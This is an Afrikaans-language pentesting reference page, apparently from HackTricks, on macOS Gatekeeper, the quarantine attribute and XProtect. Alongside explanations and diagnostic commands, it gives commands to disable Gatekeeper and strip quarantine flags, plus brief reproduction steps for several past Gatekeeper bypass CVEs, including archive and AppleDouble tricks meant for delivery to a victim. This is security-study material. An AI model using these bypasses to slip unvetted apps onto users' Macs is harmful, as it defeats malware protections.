# macOS Gatekeeper / Quarantine / XProtect

{{#include ../../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Gatekeeper

**Gatekeeper** is 'n sekuriteitskenmerk wat ontwikkel is vir Mac-bedryfstelsels, ontwerp om te verseker dat gebruikers **slegs vertroude sagteware** op hul stelsels uitvoer. Dit funksioneer deur **sagteware te verifieer** wat 'n gebruiker aflaai en probeer om te open vanaf **bronne buite die App Store**, soos 'n app, 'n plug-in, of 'n installer-pakket.

Die sleutelmeganisme van Gatekeeper lê in sy **verifikasie** proses. Dit kontroleer of die afgelaaide sagteware **onderteken is deur 'n erkende ontwikkelaar**, wat die sagteware se egtheid verseker. Verder bevestig dit of die sagteware **notarized is deur Apple**, wat bevestig dat dit vry is van bekende kwaadwillige inhoud en nie na notarisation gewysig is nie.

Boonop versterk Gatekeeper gebruikersbeheer en sekuriteit deur **gebruikers te vra om die opening** van afgelaaide sagteware vir die eerste keer goed te keur. Hierdie beskerming help om te voorkom dat gebruikers per ongeluk potensieel skadelike uitvoerbare kode uitvoer wat hulle dalk vir 'n onskadelike data-lêer verwar het.

### Aansoekhandtekeninge

Aansoekhandtekeninge, ook bekend as kodehandtekeninge, is 'n kritieke komponent van Apple se sekuriteitsinfrastruktuur. Hulle word gebruik om die **identiteit van die sagteware-outeur** (die ontwikkelaar) te **verifieer** en om te verseker dat die kode nie gewysig is nie sedert dit laas onderteken is.

Hier is hoe dit werk:

1. **Die Aansoek onderteken:** Wanneer 'n ontwikkelaar gereed is om hul aansoek te versprei, **onderteken hulle die aansoek met 'n private sleutel**. Hierdie private sleutel is geassosieer met 'n **sertifikaat wat Apple aan die ontwikkelaar uitreik** wanneer hulle in die Apple Developer Program registreer. Die ondertekeningsproses behels die skep van 'n kriptografiese hash van al die dele van die app en die versleuteling van hierdie hash met die ontwikkelaar se private sleutel.
2. **Die Aansoek versprei:** Die ondertekende aansoek word dan aan gebruikers versprei saam met die ontwikkelaar se sertifikaat, wat die ooreenstemmende publieke sleutel bevat.
3. **Die Aansoek verifieer:** Wanneer 'n gebruiker die aansoek aflaai en probeer om dit uit te voer, gebruik hul Mac-bedryfstelsel die publieke sleutel van die ontwikkelaar se sertifikaat om die hash te ontsleutel. Dit bereken dan die hash weer op grond van die huidige toestand van die aansoek en vergelyk dit met die ontsleutelde hash. As hulle ooreenstem, beteken dit **die aansoek is nie gewysig nie** sedert die ontwikkelaar dit onderteken het, en die stelsel laat die aansoek toe om uit te voer.

Aansoekhandtekeninge is 'n noodsaaklike deel van Apple se Gatekeeper-tegnologie. Wanneer 'n gebruiker probeer om **'n aansoek wat van die internet afgelaai is, te open**, verifieer Gatekeeper die aansoekhandtekening. As dit onderteken is met 'n sertifikaat wat deur Apple aan 'n bekende ontwikkelaar uitgereik is en die kode nie gewysig is nie, laat Gatekeeper die aansoek toe om uit te voer. Andersins blokkeer dit die aansoek en waarsku die gebruiker.

Vanaf macOS Catalina, **kontroleer Gatekeeper ook of die aansoek notarized is** deur Apple, wat 'n ekstra laag van sekuriteit toevoeg. Die notarization-proses kontroleer die aansoek vir bekende sekuriteitskwessies en kwaadwillige kode, en as hierdie kontroles slaag, voeg Apple 'n kaartjie by die aansoek wat Gatekeeper kan verifieer.

#### Kontroleer Handtekeninge

Wanneer jy 'n **kwaadwillige monster** kontroleer, moet jy altyd die **handtekening** van die binêre kontroleer, aangesien die **ontwikkelaar** wat dit onderteken het, dalk reeds **verbonde** is met **kwaadwillige kode.**
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarization

Apple se notarization proses dien as 'n addisionele beskerming om gebruikers te beskerm teen potensieel skadelike sagteware. Dit behels die **ontwikkelaar wat hul aansoek indien vir ondersoek** deur **Apple se Notary Service**, wat nie verwar moet word met App Review nie. Hierdie diens is 'n **geoutomatiseerde stelsel** wat die ingediende sagteware ondersoek vir die teenwoordigheid van **kwaadwillige inhoud** en enige potensiële probleme met kode-handtekening.

As die sagteware **slaag** vir hierdie inspeksie sonder om enige bekommernisse te wek, genereer die Notary Service 'n notarization kaartjie. Die ontwikkelaar moet dan **hierdie kaartjie aan hul sagteware heg**, 'n proses bekend as 'stapling.' Verder word die notarization kaartjie ook aanlyn gepubliseer waar Gatekeeper, Apple se sekuriteitstegnologie, dit kan toegang.

By die gebruiker se eerste installasie of uitvoering van die sagteware, **informeer die bestaan van die notarization kaartjie - of dit aan die uitvoerbare geheg is of aanlyn gevind word - Gatekeeper dat die sagteware deur Apple notarized is**. As gevolg hiervan vertoon Gatekeeper 'n beskrywende boodskap in die aanvanklike lanseringsdialoog, wat aandui dat die sagteware deur Apple vir kwaadwillige inhoud nagegaan is. Hierdie proses verbeter dus die gebruiker se vertroue in die sekuriteit van die sagteware wat hulle op hul stelsels installeer of uitvoer.

### spctl & syspolicyd

> [!CAUTION]
> Let daarop dat vanaf Sequoia weergawe, **`spctl`** nie meer toelaat om Gatekeeper konfigurasie te wysig nie.

**`spctl`** is die CLI-gereedskap om te tel en te kommunikeer met Gatekeeper (met die `syspolicyd` daemon via XPC-boodskappe). Byvoorbeeld, dit is moontlik om die **status** van GateKeeper te sien met:
```bash
# Check the status
spctl --status
```
> [!CAUTION]
> Let daarop dat GateKeeper-handtekeningkontroles slegs uitgevoer word op **lêers met die Quarantine-attribuut**, nie op elke lêer nie.

GateKeeper sal nagaan of 'n binêre volgens die **voorkeure & die handtekening** uitgevoer kan word:

<figure><img src="../../../images/image (1150).png" alt=""><figcaption></figcaption></figure>

**`syspolicyd`** is die hoofdaemon wat verantwoordelik is vir die afdwinging van Gatekeeper. Dit hou 'n databasis in `/var/db/SystemPolicy` en dit is moontlik om die kode te vind om die [databasis hier te ondersteun](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/policydb.cpp) en die [SQL-sjabloon hier](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/syspolicy.sql). Let daarop dat die databasis nie deur SIP beperk is nie en skryfbaar is deur root, en die databasis `/var/db/.SystemPolicy-default` word as 'n oorspronklike rugsteun gebruik in die geval dat die ander beskadig raak.

Boonop bevat die bundels **`/var/db/gke.bundle`** en **`/var/db/gkopaque.bundle`** lêers met reëls wat in die databasis ingevoeg word. Jy kan hierdie databasis as root nagaan met:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
**`syspolicyd`** stel ook 'n XPC-bediener bloot met verskillende operasies soos `assess`, `update`, `record` en `cancel` wat ook bereik kan word met **`Security.framework` se `SecAssessment*`** APIs en **`xpctl`** praat eintlik met **`syspolicyd`** via XPC.

Let op hoe die eerste reël eindig in "**App Store**" en die tweede een in "**Developer ID**" en dat dit in die vorige beeld **geaktiveer was om aansoeke van die App Store en geïdentifiseerde ontwikkelaars** uit te voer.\
As jy daardie instelling na App Store **wysig**, sal die "**Notarized Developer ID" reëls verdwyn**.

Daar is ook duisende reëls van **type GKE** :
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Hierdie is hashes wat afkomstig is van:

- `/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`
- `/var/db/gke.bundle/Contents/Resources/gk.db`
- `/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`

Of jy kan die vorige inligting lys met:
```bash
sudo spctl --list
```
Die opsies **`--master-disable`** en **`--global-disable`** van **`spctl`** sal hierdie handtekening kontroles heeltemal **deaktiveer**:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Wanneer dit heeltemal geaktiveer is, sal 'n nuwe opsie verskyn:

<figure><img src="../../../images/image (1151).png" alt=""><figcaption></figcaption></figure>

Dit is moontlik om te **kontroleer of 'n App deur GateKeeper toegelaat sal word** met:
```bash
spctl --assess -v /Applications/App.app
```
Dit is moontlik om nuwe reëls in GateKeeper by te voeg om die uitvoering van sekere toepassings toe te laat met:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
Betreffende **kernel uitbreidings**, die gids `/var/db/SystemPolicyConfiguration` bevat lêers met lyste van kexts wat toegelaat word om gelaai te word. Boonop het `spctl` die regte `com.apple.private.iokit.nvram-csr` omdat dit in staat is om nuwe vooraf-goedgekeurde kernel uitbreidings by te voeg wat ook in NVRAM in 'n `kext-allowed-teams` sleutel gestoor moet word.

### Quarantine Lêers

By **aflaai** van 'n toepassing of lêer, spesifieke macOS **toepassings** soos webblaaiers of e-pos kliënte **heg 'n uitgebreide lêer eienskap** aan, algemeen bekend as die "**quarantine vlag**," aan die afgelaaide lêer. Hierdie eienskap dien as 'n sekuriteitsmaatreël om die **lêer** te **merk** as afkomstig van 'n onbetroubare bron (die internet), en potensieel risiko's dra. egter, nie alle toepassings heg hierdie eienskap aan nie, byvoorbeeld, algemene BitTorrent kliënt sagteware omseil gewoonlik hierdie proses.

**Die teenwoordigheid van 'n quarantine vlag dui op macOS se Gatekeeper sekuriteitskenmerk wanneer 'n gebruiker probeer om die lêer uit te voer**.

In die geval waar die **quarantine vlag nie teenwoordig is nie** (soos met lêers afgelaai via sommige BitTorrent kliënte), mag Gatekeeper se **kontroles nie uitgevoer word nie**. Dus, gebruikers moet versigtig wees wanneer hulle lêers wat van minder veilige of onbekende bronne afgelaai is, oopmaak.

> [!NOTE] > **Kontroleer** die **geldigheid** van kode handtekeninge is 'n **hulpbron-intensiewe** proses wat die generering van kriptografiese **hashes** van die kode en al sy saamgebonde hulpbronne insluit. Verder behels die kontrole van sertifikaat geldigheid 'n **aanlyn kontrole** teen Apple se bedieners om te sien of dit herroep is nadat dit uitgereik is. Om hierdie redes is 'n volledige kode handtekening en notarization kontrole **onprakties om elke keer uit te voer wanneer 'n app gelaai word**.
>
> Daarom word hierdie kontroles **slegs uitgevoer wanneer toepassings met die quarantined eienskap uitgevoer word.**

> [!WARNING]
> Hierdie eienskap moet **gestel word deur die toepassing wat die lêer skep/aflaai**.
>
> egter, lêers wat in 'n sandbox is, sal hierdie eienskap aan elke lêer wat hulle skep, stel. En nie-sandboxed toepassings kan dit self stel, of die [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc) sleutel in die **Info.plist** spesifiseer wat die stelsel sal dwing om die `com.apple.quarantine` uitgebreide eienskap op die geskepte lêers te stel,

Boonop is alle lêers wat deur 'n proses wat **`qtn_proc_apply_to_self`** aanroep, in kwarantyn. Of die API **`qtn_file_apply_to_path`** voeg die kwarantyn eienskap by 'n gespesifiseerde lêer pad.

Dit is moontlik om **sy status te kontroleer en in/uit te skakel** (root benodig) met:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Jy kan ook **vind of 'n lêer die kwarantyn-uitgebreide attribuut het** met:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
Kontroleer die **waarde** van die **verlengde** **kenmerke** en vind die toepassing wat die kwarantyn kenmerk geskryf het met:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
Werklik kan 'n proses "karantynvlagte aan die lêers wat dit skep, stel" (Ek het al probeer om die USER_APPROVED-vlag in 'n geskepte lêer toe te pas, maar dit sal nie toegepas word nie):

<details>

<summary>Bronkode pas karantynvlagte toe</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

En **verwyder** daardie attribuut met:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
En vind al die karantynlêers met:
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
Quarantynasie-inligting word ook in 'n sentrale databasis gestoor wat deur LaunchServices bestuur word in **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**, wat die GUI toelaat om data oor die lêer oorspronge te verkry. Boonop kan dit oorgeskryf word deur toepassings wat dalk belangstel om sy oorspronge te verberg. Boonop kan dit vanaf LaunchServices APIS gedoen word.

#### **libquarantine.dylb**

Hierdie biblioteek voer verskeie funksies uit wat toelaat om die uitgebreide attribuut velde te manipuleer.

Die `qtn_file_*` APIs hanteer lêer quarantynbeleid, die `qtn_proc_*` APIs word toegepas op prosesse (lêers geskep deur die proses). Die nie-uitgevoerde `__qtn_syscall_quarantine*` funksies is diegene wat die beleid toepas wat `mac_syscall` met "Quarantine" as eerste argument aanroep wat die versoeke na `Quarantine.kext` stuur.

#### **Quarantine.kext**

Die kernuitbreiding is slegs beskikbaar deur die **kernkas op die stelsel**; egter, jy _kan_ die **Kernel Debug Kit van** [**https://developer.apple.com/**](https://developer.apple.com/) aflaai, wat 'n gesimboliseerde weergawe van die uitbreiding sal bevat.

Hierdie Kext sal via MACF verskeie oproepe haak om al die lêer lewensiklus gebeurtenisse te vang: Skepping, opening, hernoeming, hard-koppeling... selfs `setxattr` om te voorkom dat dit die `com.apple.quarantine` uitgebreide attribuut stel.

Dit gebruik ook 'n paar MIBs:

- `security.mac.qtn.sandbox_enforce`: Handhaaf quarantyn langs Sandbox
- `security.mac.qtn.user_approved_exec`: Quarantined prosesse kan slegs goedgekeurde lêers uitvoer

### XProtect

XProtect is 'n ingeboude **anti-malware** kenmerk in macOS. XProtect **kontroleer enige toepassing wanneer dit eerste keer gelaai of gewysig word teen sy databasis** van bekende malware en onveilige lêertipes. Wanneer jy 'n lêer aflaai deur sekere toepassings, soos Safari, Mail, of Messages, skandeer XProtect outomaties die lêer. As dit ooreenstem met enige bekende malware in sy databasis, sal XProtect **die lêer van uitvoering verhoed** en jou waarsku oor die bedreiging.

Die XProtect databasis word **gereeld opgedateer** deur Apple met nuwe malware definisies, en hierdie opdaterings word outomaties afgelaai en op jou Mac geïnstalleer. Dit verseker dat XProtect altyd op datum is met die nuutste bekende bedreigings.

Dit is egter die moeite werd om te noem dat **XProtect nie 'n volwaardige antivirusoplossing is nie**. Dit kontroleer slegs vir 'n spesifieke lys van bekende bedreigings en voer nie toegangskandering uit soos die meeste antivirusprogrammatuur nie.

Jy kan inligting oor die nuutste XProtect-opdatering verkry deur:
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
XProtect is geleë op. SIP beskermde ligging by **/Library/Apple/System/Library/CoreServices/XProtect.bundle** en binne die bundel kan jy inligting vind wat XProtect gebruik:

- **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Laat kode met daardie cdhashes toe om legacy regte te gebruik.
- **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: Lys van plugins en uitbreidings wat nie toegelaat word om te laai via BundleID en TeamID of wat 'n minimum weergawe aandui nie.
- **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Yara reëls om malware te detecteer.
- **`XProtect.bundle/Contents/Resources/gk.db`**: SQLite3 databasis met hashes van geblokkeerde toepassings en TeamIDs.

Let daarop dat daar 'n ander App in **`/Library/Apple/System/Library/CoreServices/XProtect.app`** is wat verband hou met XProtect wat nie betrokke is by die Gatekeeper-proses nie.

### Nie Gatekeeper nie

> [!CAUTION]
> Let daarop dat Gatekeeper **nie elke keer uitgevoer word** wanneer jy 'n toepassing uitvoer nie, net _**AppleMobileFileIntegrity**_ (AMFI) sal slegs **uitvoerbare kode handtekeninge verifieer** wanneer jy 'n app uitvoer wat reeds deur Gatekeeper uitgevoer en geverifieer is.

Daarom was dit voorheen moontlik om 'n app uit te voer om dit met Gatekeeper te kas, dan **nie-uitvoerbare lêers van die toepassing te wysig** (soos Electron asar of NIB lêers) en as daar geen ander beskermings in plek was nie, is die toepassing **uitgevoer** met die **kwaadwillige** toevoegings.

Nou is dit egter nie meer moontlik nie omdat macOS **wysig lêers** binne toepassingsbundels voorkom. So, as jy die [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) aanval probeer, sal jy vind dat dit nie meer moontlik is om dit te misbruik nie omdat jy, nadat jy die app uitgevoer het om dit met Gatekeeper te kas, nie die bundel kan wysig nie. En as jy byvoorbeeld die naam van die Contents-gids na NotCon verander (soos aangedui in die exploit), en dan die hoof binêre van die app uitvoer om dit met Gatekeeper te kas, sal dit 'n fout veroorsaak en nie uitvoer nie.

## Gatekeeper Omseilings

Enige manier om Gatekeeper te omseil (om te regverdig dat die gebruiker iets aflaai en dit uitvoer wanneer Gatekeeper dit sou verhoed) word beskou as 'n kwesbaarheid in macOS. Dit is 'n paar CVEs wat aan tegnieke toegeken is wat in die verlede toegelaat het om Gatekeeper te omseil:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

Daar is waargeneem dat as die **Archive Utility** vir ekstraksie gebruik word, lêers met **paaie wat 886 karakters oorskry** nie die com.apple.quarantine uitgebreide attribuut ontvang nie. Hierdie situasie laat daardie lêers per ongeluk toe om **Gatekeeper se** sekuriteitskontroles te **omseil**.

Kyk na die [**oorspronklike verslag**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) vir meer inligting.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Wanneer 'n toepassing geskep word met **Automator**, is die inligting oor wat dit benodig om uit te voer binne `application.app/Contents/document.wflow` en nie in die uitvoerbare nie. Die uitvoerbare is net 'n generiese Automator binêre genaamd **Automator Application Stub**.

Daarom kon jy `application.app/Contents/MacOS/Automator\ Application\ Stub` **met 'n simboliese skakel na 'n ander Automator Application Stub binne die stelsel laat wys** en dit sal uitvoer wat binne `document.wflow` (jou skrip) is **sonder om Gatekeeper te aktiveer** omdat die werklike uitvoerbare nie die kwarantyn xattr het nie.

Voorbeeld van verwagte ligging: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Kyk na die [**oorspronklike verslag**](https://ronmasas.com/posts/bypass-macos-gatekeeper) vir meer inligting.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

In hierdie omseiling is 'n zip-lêer geskep met 'n toepassing wat begin om te komprimeer vanaf `application.app/Contents` in plaas van `application.app`. Daarom is die **kwarantyn attribuut** op al die **lêers van `application.app/Contents`** toegepas maar **nie op `application.app` nie**, wat was wat Gatekeeper nagegaan het, so Gatekeeper is omseil omdat wanneer `application.app` geaktiveer is, dit **nie die kwarantyn attribuut gehad het nie.**
```bash
zip -r test.app/Contents test.zip
```
Kontroleer die [**oorspronklike verslag**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) vir meer inligting.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Selfs al is die komponente verskillend, is die uitbuiting van hierdie kwesbaarheid baie soortgelyk aan die vorige een. In hierdie geval sal ons 'n Apple-argief genereer vanaf **`application.app/Contents`** sodat **`application.app` nie die kwarantyn-attribuut** sal ontvang wanneer dit deur **Archive Utility** ontpak word.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Kontrollere die [**oorspronklike verslag**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) vir meer inligting.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

Die ACL **`writeextattr`** kan gebruik word om te voorkom dat iemand 'n attribuut in 'n lêer skryf:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Boonop, **AppleDouble** lêerformaat kopieer 'n lêer insluitend sy ACEs.

In die [**bronkode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) is dit moontlik om te sien dat die ACL teksverteenwoordiging wat binne die xattr genaamd **`com.apple.acl.text`** gestoor word, as ACL in die gedecomprimeerde lêer gestel gaan word. So, as jy 'n toepassing in 'n zip-lêer met **AppleDouble** lêerformaat gekompresseer het met 'n ACL wat voorkom dat ander xattrs daarop geskryf word... was die kwarantyn xattr nie in die toepassing gestel nie:
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
Kontroleer die [**oorspronklike verslag**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) vir meer inligting.

Let daarop dat dit ook met AppleArchives uitgebuit kan word:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Daar is ontdek dat **Google Chrome nie die kwarantyn-attribuut** aan afgelaaide lêers toegeken het nie weens sommige macOS interne probleme.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble lêerformate stoor die attribuut van 'n lêer in 'n aparte lêer wat begin met `._`, dit help om lêerattribuut **oor macOS masjiene** te kopieer. Dit is egter opgemerk dat na die dekompressie van 'n AppleDouble lêer, die lêer wat met `._` begin **nie die kwarantyn-attribuut** ontvang het nie.
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
Die vermoë om 'n lêer te skep wat nie die kwarantyn-attribuut sal hê nie, het dit **moontlik gemaak om Gatekeeper te omseil.** Die truuk was om **'n DMG-lêer toepassing** te skep met die AppleDouble naam konvensie (begin dit met `._`) en 'n **sigbare lêer as 'n sim link na hierdie versteekte** lêer te skep sonder die kwarantyn-attribuut.\
Wanneer die **dmg-lêer uitgevoer word**, sal dit, aangesien dit nie 'n kwarantyn-attribuut het nie, **Gatekeeper omseil.**
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### uchg (uit hierdie [praatjie](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf))

- Skep 'n gids wat 'n app bevat.
- Voeg uchg by die app.
- Komprimeer die app na 'n tar.gz-lêer.
- Stuur die tar.gz-lêer na 'n slagoffer.
- Die slagoffer open die tar.gz-lêer en voer die app uit.
- Gatekeeper kontroleer nie die app nie.

### Voorkom Quarantine xattr

In 'n ".app" bundel, as die quarantine xattr nie daaraan bygevoeg word nie, wanneer dit uitgevoer word **sal Gatekeeper nie geaktiveer word nie**.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../../banners/hacktricks-training.md}}
